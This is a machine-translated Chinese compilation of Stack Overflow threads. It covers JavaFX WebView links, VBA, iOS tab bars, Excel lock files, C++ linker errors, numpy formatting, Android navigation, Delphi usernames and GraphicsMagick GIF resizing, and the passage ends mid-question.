wv.getEngine().executeScript("history.back()"); 
```

同上，没有效果。

## 4\. 对阶段变化做出反应

我也尝试过而不是查看`locationProperty`of `WebEngine`，而是听 chenges for `stateProperty`of the`Worker`并触发相同的打开代码 if `newState == State.SCHEDULED`。结果与以前的方法没有区别（除了实际上不能使用#1）。

* * *

## 更新

我现在使用的代码仍然会使 JVM 崩溃：

```
this.wv.getEngine().locationProperty().addListener(new ChangeListener<String>() {
    @Override
    public void changed(ObservableValue<? extends String> observable, final String oldValue, String newValue)
    {
        Desktop d = Desktop.getDesktop();
        try
        {
            URI address = new URI(newValue);
            if ((address.getQuery() + "").indexOf("_openmodal=true") > -1)
            {
                Platform.runLater(new Runnable() {
                    @Override
                    public void run()
                    {
                        wv.getEngine().load(oldValue);
                    }
                });
                d.browse(address);
            }
        }
        catch (IOException | URISyntaxException e)
        {
            displayError(e);
        }
    }
}); 
```

* * *

## 解决方法

好的，我设法通过拆除 webview 并重建它来使其工作。

```
this.wv.getEngine().locationProperty().addListener(new ChangeListener<String>() {
    @Override
    public void changed(ObservableValue<? extends String> observable, final String oldValue, String newValue)
    {
        Desktop d = Desktop.getDesktop();
        try
        {
            URI address = new URI(newValue);
            if ((address.getQuery() + "").indexOf("_openmodal=true") > -1)
            {
                Platform.runLater(new Runnable() {
                    @Override
                    public void run()
                    {
                        grid_layout.getChildren().remove(wv);
                        wv = new WebView();
                        grid_layout.add(wv, 0, 1);
                        wv.getEngine().load(oldValue);
                    }
                });
                d.browse(address);
            }
        }
        catch (IOException | URISyntaxException e)
        {
            displayError(e);
        }
    }
}); 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-08-30T15:29:58.750

还有另一种处理方法。

您可以将事件侦听器添加到 DOM 元素并以这种方式拦截它。

例子：

```
NodeList nodeList = document.getElementsByTagName("a");
            for (int i = 0; i < nodeList.getLength(); i++)
            {
                Node node= nodeList.item(i);
                EventTarget eventTarget = (EventTarget) node;
                eventTarget.addEventListener("click", new EventListener()
                {
                    @Override
                    public void handleEvent(Event evt)
                    {
                        EventTarget target = evt.getCurrentTarget();
                        HTMLAnchorElement anchorElement = (HTMLAnchorElement) target;
                        String href = anchorElement.getHref();
                        //handle opening URL outside JavaFX WebView
                        System.out.println(href);
                        evt.preventDefault();
                    }
                }, false);
            } 
```

其中 document 是 DOM 文档对象。确保在文档完成加载后完成此操作。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-10-30T21:46:18.143

我终于找到了一个对我有用的解决方案：

```
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.concurrent.Worker;
import javafx.scene.web.WebView;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.w3c.dom.events.Event;
import org.w3c.dom.events.EventListener;
import org.w3c.dom.events.EventTarget;
import org.w3c.dom.html.HTMLAnchorElement;

import java.awt.*;
import java.net.URI;

public class HyperLinkRedirectListener implements ChangeListener<Worker.State>, EventListener
{
    private static final String CLICK_EVENT = "click";
    private static final String ANCHOR_TAG = "a";

    private final WebView webView;

    public HyperLinkRedirectListener(WebView webView)
    {
        this.webView = webView;
    }

    @Override
    public void changed(ObservableValue<? extends Worker.State> observable, Worker.State oldValue, Worker.State newValue)
    {
        if (Worker.State.SUCCEEDED.equals(newValue))
        {
            Document document = webView.getEngine().getDocument();
            NodeList anchors = document.getElementsByTagName(ANCHOR_TAG);
            for (int i = 0; i < anchors.getLength(); i++)
            {
                Node node = anchors.item(i);
                EventTarget eventTarget = (EventTarget) node;
                eventTarget.addEventListener(CLICK_EVENT, this, false);
            }
        }
    }

    @Override
    public void handleEvent(Event event)
    {
        HTMLAnchorElement anchorElement = (HTMLAnchorElement) event.getCurrentTarget();
        String href = anchorElement.getHref();

        if (Desktop.isDesktopSupported())
        {
            openLinkInSystemBrowser(href);
        } else
        {
            // LOGGER.warn("OS does not support desktop operations like browsing. Cannot open link '{}'.", href);
        }

        event.preventDefault();
    }

    private void openLinkInSystemBrowser(String url)
    {
        // LOGGER.debug("Opening link '{}' in default system browser.", url);

        try
        {
            URI uri = new URI(url);
            Desktop.getDesktop().browse(uri);
        } catch (Throwable e)
        {
            // LOGGER.error("Error on opening link '{}' in system browser.", url);
        }
    }
} 
```

用法：

```
webView.getEngine().getLoadWorker().stateProperty().addListener(new HyperLinkRedirectListener(webView)); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-01-22T23:39:42.700

这对我有用，因为我通常必须用 target="_blank" 捕获任何锚。我不得不通过向 DOM 询问指针下的所有元素（例如：hover）来解决 PopupFeatures 回调绝对没有有用的上下文这一事实。

```
// intercept target=_blank hyperlinks
webView.getEngine().setCreatePopupHandler(
    new Callback<PopupFeatures, WebEngine>() {
        @Override
        public WebEngine call(PopupFeatures config) {
            // grab the last hyperlink that has :hover pseudoclass
            Object o = webView
                    .getEngine()
                    .executeScript(
                            "var list = document.querySelectorAll( ':hover' );"
                                    + "for (i=list.length-1; i>-1; i--) "
                                    + "{ if ( list.item(i).getAttribute('href') ) "
                                    + "{ list.item(i).getAttribute('href'); break; } }");

            // open in native browser
            try {
                if (o != null) {
                    Desktop.getDesktop().browse(
                            new URI(o.toString()));
                } else {
                    log.error("No result from uri detector: " + o);
                }
            } catch (IOException e) {
                log.error("Unexpected error obtaining uri: " + o, e);
            } catch (URISyntaxException e) {
                log.error("Could not interpret uri: " + o, e);
            }

            // prevent from opening in webView
            return null;
        }
    }); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-21T18:56:40.470

@Avrom 的使用 DOM 拦截器的答案提供了比这个答案更好的解决方案：“JavaFX stop opening URL in WebView - open in browser instead”。

这个答案留给后人。

* * *

使用选项 1`engine.load(oldValue)`并将加载调用包装在[Platform.runLater](http://docs.oracle.com/javafx/2/api/javafx/application/Platform.html#runLater%28java.lang.Runnable%29)作为一种解决方法，以防止 jvm 崩溃。

```
import javafx.application.*;
import javafx.beans.value.*;
import javafx.scene.Scene;
import javafx.scene.web.*;
import javafx.stage.Stage;

public class GoogleBlock extends Application {
  public static void main(String[] args) throws Exception { launch(args); }

  @Override public void start(final Stage stage) throws Exception {
    final WebView webView = new WebView();
    final WebEngine engine = webView.getEngine();
    engine.load("http://www.google.com");
    engine.locationProperty().addListener(new ChangeListener<String>() {
      @Override public void changed(ObservableValue<? extends String> ov, final String oldLoc, final String loc) {
        if (!loc.contains("google.com")) {
          Platform.runLater(new Runnable() {
            @Override public void run() {
              engine.load(oldLoc);
            }
          });
        }
      }
    });

    stage.setScene(new Scene(webView));
    stage.show();
  }
} 
```

**更新**

尽管上述解决方案在 jdk7u15、win7 下提供的 GoogleBlock 示例应用程序中对我来说可以正常工作，但 Dreen 报告说，仅在 Platform.runLater 中包装负载值并不能解决所有情况下的崩溃问题，因此将 WebView 对象完全替换为新的 WebView （正如 Dreen 在更新的问题中概述的那样），可能是这里的首选解决方案（至少在修复基础错误之前）。

* * *

您在问题中提到的 jvm 崩溃是 JavaFX 2.2 中的一个已知问题：

[JDK-8087652 WebView 在调用 webEngine.locationProperty() ChangeListener 中的 webEngine.load(url) 时崩溃](https://bugs.openjdk.java.net/browse/JDK-8087652)。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-10-03T23:14:32.097

很抱歉挖掘了这个旧线程，但我找到了另一个解决方案，我想与其他遇到同样问题的人分享。我找到了一个库，它对整个问题都有很好的包装，请参阅[github 上的文档](https://github.com/CodeFX-org/LibFX/wiki/WebViewHyperlinkListener)。

**编辑：** 哦，抱歉没有告诉项目做什么：链接库包含一个实际上实现了该线程中讨论的所有代码的类。用户可以简单地创建一个新的`WebViewHyperlinkListener`-interface 实例，当链接发生某些事情（鼠标进入、鼠标退出、鼠标点击）时，该实例会自动调用。一旦处理程序终止，它会返回一个布尔值：如果处理程序返回`true`，WebView 将不会导航到链接的网页。如果处理程序返回`false`，它将返回。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-26T09:44:46.387

将 d.browse 调用包装到 Runnable 对象时，运行时错误再也不会发生。奇怪的是，没有包装 ChangeListener 在几秒钟后第二次调用相同的新位置，第二次调用使 JVM 崩溃。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-03-09T16:54:38.070

我找到了另一个解决方案：

1.  注册一个 CreatePopupHandler，它返回一个与主引擎不同的 WebEngine
2.  主 WebEngine 将 load-call 发送到辅助 WebEngine
3.  在辅助 WebEngine 上注册一个 LocationChangeListener 并捕获位置变化（包括地址）并在我们的外部浏览器中打开它
4.  最后清理辅助 WebEngine：停止加载和卸载 URL

我实现了它，因此辅助 WebEngine 被初始化为惰性。它也可以在构造函数中初始化。两者都有优缺点。

**注意：**这只触发作为弹出窗口打开的链接。当 a 元素的目标属性不是“_self”或 JS: 时，通常会出现这种情况`window.open(...)`。

**这里是魔术...**

像这样注册它：

```
engine.setCreatePopupHandler(new BrowserPopupHandler()); 
```

核心类：

```
public static class BrowserPopupHandler implements Callback<PopupFeatures, WebEngine>
{

    private WebEngine popupHandlerEngine;

    public WebEngine call(PopupFeatures popupFeatures)
    {
        // by returning null here the action would be canceled
        // by returning a different WebEngine (than the main one where we register our listener) the load-call will go to that one
        // we return a different WebEngine here and register a location change listener on it (see blow)
        return getPopupHandler();
    }

    private WebEngine getPopupHandler()
    {
        if (popupHandlerEngine == null) // lazy init - so we only initialize it when needed ...
        {
            synchronized (this) // double checked synchronization
            {
                if (popupHandlerEngine == null)
                {
                    popupHandlerEngine = initEngine();
                }
            }
        }
        return popupHandlerEngine;
    }

    private WebEngine initEngine()
    {
        final WebEngine popupHandlerEngine = new WebEngine();

        // this change listener will trigger when our secondary popupHandlerEngine starts to load the url ...
        popupHandlerEngine.locationProperty().addListener(new ChangeListener<String>()
        {

            public void changed(ObservableValue<? extends String> observable, String oldValue, String location)
            {
                if (!location.isEmpty())
                {
                    Platform.runLater(new Runnable()
                    {

                        public void run()
                        {
                            popupHandlerEngine.loadContent(""); // stop loading and unload the url
                            // -> does this internally: popupHandlerEngine.getLoadWorker().cancelAndReset();
                        }

                    });

                    try
                    {
                        // Open URL in Browser:
                        Desktop desktop = Desktop.getDesktop();
                        if (desktop.isSupported(Desktop.Action.BROWSE))
                        {
                            URI uri = new URI(location);
                            desktop.browse(uri);
                        }
                        else
                        {
                            System.out.println("Could not load URL: " + location);
                        }
                    }
                    catch (Exception e)
                    {
                        e.printStackTrace();
                    }
                }
            }

        });
        return popupHandlerEngine;
    }

} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-08-11T16:48:21.897

2017 版 - 仍然非常 hacky 但更简洁：

```
class AboutDialog extends Dialog {
    private final Controller controller;
    private final String url;

    AboutDialog() {
        super();

        this.controller = Controller.getInstance();

        this.setTitle(controller.getProperty("about_title"));
        this.setHeaderText(null);

        this.url = getClass().getResource("/about_dialog.html").toExternalForm();

        this.setWebView();

        this.getDialogPane().getButtonTypes().add(new ButtonType(controller.getProperty("close"), ButtonBar.ButtonData.CANCEL_CLOSE));
        this.getDialogPane().setPrefWidth(600);
    }

    private void setWebView() {
        final WebView webView = new WebView();
        webView.getEngine().load(url);

        webView.getEngine().locationProperty().addListener((observable, oldValue, newValue) -> {
            controller.getMainFxApp().getHostServices().showDocument(newValue);
            Platform.runLater(this::setWebView);
        });

        this.getDialogPane().setContent(webView);
    }
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2019-04-24T16:36:30.000

您的“更新”部分实际上非常接近我的工作，不需要解决方法：

```
wv.getEngine().locationProperty().addListener(new ChangeListener<String>() {    
            public void changed(ObservableValue<? extends String> observable, String oldValue, String newValue)
            {
                if((address.getQuery() + "").indexOf("_openmodal=true") > -1) {
                    Platform.runLater(new Runnable() {
                        public void run() {
                            try {
                                Desktop.getDesktop().browse(new URI(newValue));
                            } catch (IOException e) { //Decide how to handle:
                                //Can't find default program handler for link.
                            } catch (URISyntaxException e) {
                                //Bad syntax on link.
                            }
                            wv.getEngine().reload();
                        }
                    });
                }
            }

        }); 
```

我喜欢这种方法的地方在于，它不仅包含来自超链接元素的 URL，还包含指向电子邮件或本地文件等内容的链接。

# vba - 使用 VBA 代码从 tr 获取所有 td

> ID：15555513
> 
> 赞同：3
> 
> 时间：2013-03-21T18:37:39.087
> 
> 标签：vba, excel

![在此处输入图像描述](../Images/2a15b084fb9fa88f04bbe181a5c99950.png) ![在此处输入图像描述](../Images/78669aad162d23b66cac6d3302d93cf8.png)

我有一个 tr，它是一个对象并且有 td。我想在另一个对象变量 tblTD 中获取所有 td。为此，我使用了`Set tblTD = tr.getelementsbytagname("td")`. 但是当我检查 tblTD 的长度时，它显示为 0。有人可以建议如何做到这一点。请参考所附图片。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T19:28:05.893

如果您已经设置`tr`了该`getElementsByTagName`函数，那么您需要遍历每个 tr 对象以获取子 td 对象（或者您可以只引用一个对象）：

```
Dim td As MSHTML.IHTMLElementCollection
Dim tr As MSHTML.IHTMLElementCollection
Dim trObj as MSHTML.HTMLGenericElement
Dim tdObj as MSHTML.HTMLGenericElement

Set tr = HTMLDoc.getElementsByTagName("tr")
For Each trObj In tr
    Set td = trObj.getElementsByTagName("td")
    For Each tdObj in td
        'do something with each td object'
    Next
Next 
```

# ios - UITabBar 按钮未调整大小 iPad 横向模式

> ID：15555521
> 
> 赞同：1
> 
> 时间：2013-03-21T18:37:56.930
> 
> 标签：ios, objective-c, ipad

我在 UITabbarController 中添加了三个视图控制器。我正在查看 tabBarController 中的按钮视图，如下所示。

关联：![http://i.imgur.com/7ugGWAu.png](../Images/43e9f03cb7798a40d1304d33296b1a28.png)

左右有很大的余量，我想删除它。尽管在 iPhone 中它工作正常并且左右没有填充。这在 iPad 上可行吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-08-27T12:36:40.710

您必须将此代码放在您的 UITabBarController 的 viewWillLayoutSubviews 中。它适用于 IOS 7.0 及更高版本。

```
self.tabBar.itemPositioning = UITabBarItemPositioningFill; 
```

# excel - 如何判断 Excel 2007 电子表格是否打开以及 WHO 是否使用 VBScript 打开它

> ID：15555522
> 
> 赞同：9
> 
> 时间：2013-03-21T18:38:00.133
> 
> 标签：excel, vbscript, excel-2007

如何判断 Excel 2007 电子表格是否已打开以及谁使用 VBScript 将其打开？

我试图确定 Excel 工作簿当前是否由另一个用户打开并返回该用户在我的脚本中的身份。

我已经弄清楚谁来确定工作簿当前是否打开。这是一种解决方法，但我基本上打开工作簿并检查它是否是只读的。效果很好；我已经测试过了。

我知道这是可能的，因为如果您通过浏览器打开文件，Excel 会为您提供打开文件的用户。

这是我的代码（isWorkbookOpen.vbs）：

```
Set objExcelTestWorkbook = CreateObject("Excel.Application")
objExcelTestWorkbook.DisplayAlerts = False 'doesn't display overwrite alert
testWorkbookFile = "I:\test_workbook.xlsx"
Set objBook = objExcelTestWorkbook.Workbooks.open(testWorkbookFile)

If objBook.ReadOnly Then
    Wscript.echo "The file is read only"
    Call EndScript
Else
    Wscript.echo "The file is available"
    Call EndScript
End If

Function EndScript
    objExcelTestWorkbook.Workbooks.close
    objExcelTestWorkbook.Quit
    WScript.Echo "Closed " & testWorkbookFile
    WScript.Quit
End Function 
```

另外，我从命令行运行它：

```
cscript isWorkbookOpen.vbs 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-22T21:26:07.860

我的天才同事提醒我 Excel 的“锁定”文件。打开 excel 时，您会创建一个隐藏的系统文件，其中包含打开文件的人员姓名。锁定文件在电子表格名称前以“~$”开头。例子：

如果您有一个电子表格`testWorkbook.xlsx`，它的锁定文件将`~$testWorkbook.xlsx`位于同一目录中。

这也是检查文件是否打开的一种更快、更简单的方法，因为您实际上并没有像我以前那样打开文件。现在我只是检查锁定文件是否存在，如果存在，我检查谁是锁定文件的“所有者”，这将是当前打开电子表格的人。希望这将有助于将来的人！

这是我完美运行的代码：

```
testWorkbookLockFile = "I:\~$test_workbook.xlsx"
Set objFSO = CreateObject("Scripting.FileSystemObject")

If objFSO.FileExists(testWorkbookLockFile) Then
    WScript.Echo "The file is locked by " & GetFileOwner(testWorkbookLockFile)
Else
    WScript.Echo "The file is available"
End If

Function GetFileOwner(strFileName)
    'http://www.vbsedit.com/scripts/security/ownership/scr_1386.asp
    Set objWMIService = GetObject("winmgmts:")
    Set objFileSecuritySettings = _
    objWMIService.Get("Win32_LogicalFileSecuritySetting='" & strFileName & "'")
    intRetVal = objFileSecuritySettings.GetSecurityDescriptor(objSD)

    If intRetVal = 0 Then
       GetFileOwner = objSD.Owner.Name
    Else
       GetFileOwner = "Unknown"
    End If
End Function 
```

我想指出我没有编写 GetFileOwner 函数的胆量。我链接到我在函数中获得该代码的网站。

此外，如果您没有将位置映射到电子表格并且它位于网络上，则 UNC 路径将不起作用，您必须映射驱动器。这可以使用以下 2 行代码来完成：

```
Set objNetwork = WScript.CreateObject("WScript.Network")
objNetwork.MapNetworkDrive "Z:", "\\Server1\Share1" 
```

希望有人会从中受益。我知道网上没有太多关于如何做到这一点的信息，因为我一直在寻找它！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T13:52:39.947

您是否尝试过 Workbook.UserStatus 属性？这是 Excel VBA 帮助中的代码片段引用：

```
users = ActiveWorkbook.UserStatus
With Workbooks.Add.Sheets(1)
    For row = 1 To UBound(users, 1)
    .users = ActiveWorkbook.UserStatus
With Workbooks.Add.Sheets(1)
    For row = 1 To UBound(users, 1)
    .Cells(row, 1) = users(row, 1)
    .Cells(row, 2) = users(row, 2)
    Select Case users(row, 3)
        Case 1
            .Cells(row, 3).Value = "Exclusive"
        Case 2
            .Cells(row, 3).Value = "Shared"
    End Select
Next
End With 
```

# c++ - 在 Dev C++ 中编译类的主体时如何解决 C++ 中的链接器错误

> ID：15555524
> 
> 赞同：2
> 
> 时间：2013-03-21T18:38:02.507
> 
> 标签：c++

在设计头文件后，我正在尝试编译从电子书中获得的类的主体，但我收到以下错误消息：

> [链接器错误] c:/crossdev/src/mingw-w64-svn/mingw-w64-crt/crt/crt0_c.c:18: 未定义对“WinMain@16”的引用
> 
> 文件：C:\Users\Chuks Joe\Desktop\collect2.exe
> 
> 消息：[错误] ld 返回 1 个退出状态

头文件位于一个名为 dice.h 的单独文件中，类主体位于另一个名为 dice.cpp 的单独文件中。客户端程序也在一个名为 testdice.cpp 的单独文件中。

我如何安排这些文件以及将 .so 文件放在哪里，以便它们都可以链接在一起以便我的程序运行。

我使用的编译器是*[Dev-C++](http://en.wikipedia.org/wiki/Dev-C%2B%2B)*。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T19:00:21.197

不看代码很难分辨。[您可以在这篇文章](https://stackoverflow.com/a/12573818/401200)中查看链接器的工作原理。在您的情况下，错误很可能来自以下之一：

*   您正在尝试使用在头文件中声明的函数或方法，但忘记在源文件中定义。
*   您只使用目标文件调用链接器，`testdice`而忘记了`dice`.
*   未定义的函数是你的吗？如果没有，您很可能需要将外部库添加到链接器。

要缩小范围，请尝试使用`testdice.cpp`. 如果这导致更多的链接器错误，那么您很可能没有将所有内容链接在一起。如果它没有增加更多的错误，你很可能忘记定义函数，或者原型在源文件和头文件中略有不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:13:15.310

为了使您的代码可链接为可执行文件，它必须具有`main()`（或`WinMain()`用于 GUI 程序）入口点。在 C++ 中，一个类本身并不是一个完整的程序——执行从`main()`函数开始。

出于某种原因，即使对于非 GUI 应用程序，MinGW 链接器也会抱怨缺少`WinMain()`而不是`main()`解决链接。

您通常必须提供`main()`or`WinMain()`函数，但当您使用在内部提供它的应用程序框架（通常是 GUI）时例外。

在大多数情况下，要使用一个类，您必须实例化该类的一个对象并通过该实例调用其成员函数。静态成员函数不需要对象实例。

例子：

```
// main.cpp
#include <iostream>
#include "dice.h"

int main()
{
    cDice myDie ;
    std::cout << "Throw = " << myDie.roll() ; 
} 
```

# python - 如何居中对齐 numpy.savetxt 生成的文本？

> ID：15555525
> 
> 赞同：3
> 
> 时间：2013-03-21T18:38:02.863
> 
> 标签：python, numpy, alignment, center

[我在numpy.savetxt](http://docs.scipy.org/doc/numpy/reference/generated/numpy.savetxt.html)周围使用了一个小包装器来自动生成标题名称并为可读的输出创建某种智能的宽度对齐。一个更准系统的解决方案是在[这个答案](https://stackoverflow.com/a/1545190/467522)。

我想知道如何指定宽度并使输出文本与中心对齐，而不是像文档中所示的那样左对齐。

从`numpy.savetxt`文档中，我看到了以下信息：

> ```
> Notes
> -----
> Further explanation of the `fmt` parameter
> (``%[flag]width[.precision]specifier``): 
> ```

```
flags:
    ``-`` : left justify

    ``+`` : Forces to preceed result with + or -.

    ``0`` : Left pad the number with zeros instead of space (see width).

width:
    Minimum number of characters to be printed. The value is not truncated
    if it has more characters. 
```

文档指向[python mini格式规范](http://docs.python.org/2/library/string.html#format-specification-mini-language)中更“详尽的资源” ，但那里的信息与对齐信息不兼容。

> 各种对齐选项的含义如下：

```
Option  Meaning
'<'     Forces the field to be left-aligned within the available space (this is the default for most objects).
'>'     Forces the field to be right-aligned within the available space (this is the default for numbers).
'='     Forces the padding to be placed after the sign (if any) but before the digits. This is used for printing fields in the form ‘+000000120’. This alignment option is only valid for numeric types.
'^'     Forces the field to be centered within the available space. 
```

不兼容是因为 savetxt 不接受`'^'`作为有效的格式字符。任何人都可以阐明如何在“numpy.savetxt”中指定格式以使输出居中对齐吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-09T19:59:36.577

您可以使用以下方式组合更复杂的格式选项，包括居中`'^'`标志`format`：

```
import numpy as np
a = np.ones((3,3))*100
a[1,1]=111.12321
a[2,2]=1
np.savetxt('tmp.txt',a, fmt='{:*^10}'.format('%f')) 
```

给予：

```
****100.000000**** ****100.000000**** ****100.000000****
****100.000000**** ****111.123210**** ****100.000000****
****100.000000**** ****100.000000**** ****1.000000**** 
```

# android - 应用程序导航：微调器 + 操作栏选项卡

> ID：15555526
> 
> 赞同：0
> 
> 时间：2013-03-21T18:38:06.853
> 
> 标签：android, android-layout, android-actionbar, android-spinner, android-tabs

我在应用程序中实现导航时遇到问题。我想用`Spinner`like menu，在这里你可以选择`item`你感兴趣的并获得相应的数据。然后此数据将设置为 ActionBar 选项卡。

![应用程序](../Images/cfb9f4ab9c01884d2296d80fe2fa9045.png)

我已经实现了微调器和选项卡，但是出现了一个问题。Android 不允许在 中使用可变变量`OnItemSelectedListener`，而我需要它。

```
final ActionBar.Tab tabToday= actionBar.newTab().setText("Today");
final ActionBar.Tab tabSoon = actionBar.newTab().setText("Soon");

..............................

spinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener(){

            @Override
            public void onItemSelected(AdapterView<?> arg0, View arg1, int arg2, long arg3) {
                switch(arg2){
                case 0:
                    tabToday.setTabListener(new CustomTabListener(MainActivity.this,"item_1", "url"));
                    tabSoon.setTabListener(new CustomTabListener(MainActivity.this,"item_1", "url_2"));

                    actionBar.addTab(tabToday);
                    actionBar.addTab(tabSoon);              
                    break;

                case 1:
                    tabToday.setTabListener(new CustomTabListener(MainActivity.this,"item_2", "url_3"));
                    tabSoon.setTabListener(new CustomTabListener(MainActivity.this,"item_2", "url_4"));

                    break;

                case 2:
                    tabToday.setTabListener(new CustomTabListener(MainActivity.this,"item_3", "url_5"));
                    tabSoon.setTabListener(new CustomTabListener(MainActivity.this,"item_3", "url_6"));
                    break;
                }
        } 
```

问题是我不能使用非`final`变量，并且由于这种情况发生：

![在此处输入图像描述](../Images/2cc8b6f2d24e7355b35c4dddc3ff94da.png)

有没有办法解决这个问题，但保持不变的导航？感谢您的阅读，任何帮助将不胜感激。:)

编辑：问题不在最终变量中，但问题仍然存在:((

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:43:25.517

我不确定为什么*final*会导致该问题，但您可以通过让您的活动实现*AdapterView.OnItemSelectedListener来避免使用该关键字，方法是不创建匿名类*

并打电话

```
spinner.setOnItemSelectedListener(this); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-17T05:42:54.510

已经解决了这个问题，列表将始终为每次交互填充相同的数据。就我而言，问题出在您升级片段时：

```
 if(mFragment==null){
               mFragment = Fragment.instantiate(mActivity, mClass.getName());
  /*correct:*/ ft.replace(android.R.id.content,mFragment, mTag);
               ft.add
        }else{
/*correct:*/  ft.attach(mFragment);
        } /*notUse*/ ft.add(mFragment); 
```

# delphi - delphi如何获取当前用户的名字？

> ID：15555527
> 
> 赞同：4
> 
> 时间：2013-03-21T18:38:06.890
> 
> 标签：delphi, firemonkey

嗨，我在 Windows 8 中使用带有 XE3 的 delphi FM2。

我遇到的问题是我希望用户按下按钮，然后导航到位于 appdata ex 中的子文件夹。C:\Users\Kobus\AppData\Roaming.minecraft

每个人都有不同的用户名，所以这行不通。

所以我使用这段代码来获取用户名：

```
function GetCurrentUserName : string;
const
  cnMaxUserNameLen = 254;
var
  sUserName     : string;
  dwUserNameLen : DWord;
begin
  dwUserNameLen := cnMaxUserNameLen-1;
  SetLength( sUserName, cnMaxUserNameLen );
  GetUserName(PChar( sUserName ),dwUserNameLen );
  SetLength( sUserName, dwUserNameLen );
  Result := sUserName;
end;

username := GetCurrentUserName; 
```

然后我说`ShowMessage('C:\Users\'+username+'\AppData\Roaming\.minecraft\saves\');`检查输出。

我得到的输出是：'C:\Users\Kobus' 由于某种原因，路径名的其余部分丢失了。

我需要显示的是：'C:\Users\'Kobus'\AppData\Roaming.minecraft\saves\'

谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-21T18:41:07.850

问题是`dwUserNameLen`包含字符串的长度，包括尾随零终止符。所以当你这样做时：

```
SetLength(sUserName, dwUserNameLen); 
```

这导致`sUserName`设置为`'Kobus#0'`。在某些时候，您然后将其传递给 Windows API 对话框函数，该函数将字符串视为以空值结尾的字符串，并在杂散的空值终止符处截断字符串。

所以你像这样修复它：

```
SetLength(sUserName, dwUserNameLen-1); 
```

请注意，如果`GetUserName`调用失败，您还应该检查返回值：

```
if not GetUserName(PChar(sUserName), dwUserNameLen) then
  RaiseLastOSError; 
```

或更清晰的变体：

```
Win32Check(GetUserName(PChar(sUserName), dwUserNameLen)); 
```

最后一点。这是获取漫游应用程序数据文件夹的错误方法。首先，您假设各种实现细节。您的方法将在使用不同命名模式的旧版本 Windows 上失败。或某些未来版本的 Windows。或者以不同方式配置的当前版本。

正确的做法是询问系统漫游应用程序数据文件夹在哪里。使用`CSIDL_APPDATA`（对于旧 Windows 版本）或`FOLDERID_RoamingAppData`（对于现代 Windows 版本）执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-03T13:38:16.927

我不需要挖太久就能找到一个片段:)。所以我在自己的应用程序中使用的东西，在总结了提示之后，变成了：

```
//=================================================================
procedure TMainF1.UserTestClick(Sender: TObject);
const
  cnMaxUserNameLen = 254;
var
  sUserName     : string;
  dwUserNameLen : DWord;
begin
  dwUserNameLen := cnMaxUserNameLen-1;
  SetLength( sUserName, cnMaxUserNameLen );
  Win32Check(GetUserName( PChar(sUserName), dwUserNameLen ));
  sUserName := PChar( sUserName );
  label_user.Caption := UpperCase(sUserName);
end;

//== works well with D7 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-01-04T00:40:38.040

我认为您的问题是[XY 问题之一](https://meta.stackexchange.com/questions/66377/what-is-the-xy-problem)

您想要阅读完整路径的实际问题`%AppData%\.minecraft\saves\`

而你在思考如何阅读当前`Username`

看看[CSIDL](https://msdn.microsoft.com/en-us/library/windows/desktop/bb762494%28v=vs.85%29.aspx)和[SHGetFolderPath](https://msdn.microsoft.com/en-us/library/windows/desktop/bb762181%28v=vs.85%29.aspx)

```
function GetShellFolder(CSIDLFolder : integer) : string;
begin
  SetLength(Result, MAX_PATH);
  SHGetSpecialFolderPath(0, PChar(Result), CSIDLFolder, false);
  SetLength(Result, StrLen(PChar(Result)));
  if (Result <> '') then
    Result  := IncludeTrailingBackslash(Result);
end;

....

//Usage
ShowMessage(GetShellFolder(CSIDL_APPDATA)+'.minecraft\saves'); 
```

**更新**

选择

检查单元中的[GetHomePath](http://docwiki.embarcadero.com/Libraries/XE7/en/System.IOUtils.TPath.GetHomePath)函数`System.IOUtils`。

将为多平台执行您想要的相同结果。

```
uses System.IOUtils;

procedure TForm17.btn1Click(Sender: TObject);
begin
    ShowMessage(TPath.GetHomePath() + TPath.DirectorySeparatorChar + '.minecraft\saves');
end; 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2013-03-21T18:49:22.650

```
username := GetEnvironmentVariable('username'); 
```

设置`username`为当前用户的名称，避免了复杂性。

# graphicsmagick - 调整 GIF 大小会丢失动画

> ID：15555535
> 
> 赞同：5
> 
> 时间：2013-03-21T18:38:26.607
> 
> 标签：graphicsmagick, im4java

我正在使用 GraphicsMagick (1.3.16) 和 im4java (1.4.0) 创建 GIF 的缩略图。在命令行中，我可以执行以下操作：

```
convert original.gif -coalesce -resize 100x100 +profile * thumb.gif 
```

缩略图创建成功，保留动画。但是我的应用程序中的某些内容没有翻译，因为看似相同/相似的命令：

```
- -coalesce -resize 100x100 +profile * gif:- 
```

创建仅捕获动画的单个图像的缩略图。注意：输入通过管道输入，输出捕获为 BufferedImage。

如果有帮助，这里是用于创建我正在使用的上述 cmd 的代码块：

```
public static BufferedImage createThumb(byte[] imageFileData)
{
  GMOperation op = new GMOperation();
  op.addImage("-"); // input: stdin
  op.coalesce();
  op.resize(100, 100);
  op.p_profile("*");
  op.addImage("gif:-"); // output: stdout

  ConvertCmd cmd = new ConvertCmd(true); // use GraphicsMagick

  // Pipe the fileData to stdin, to avoid writing to a file first.
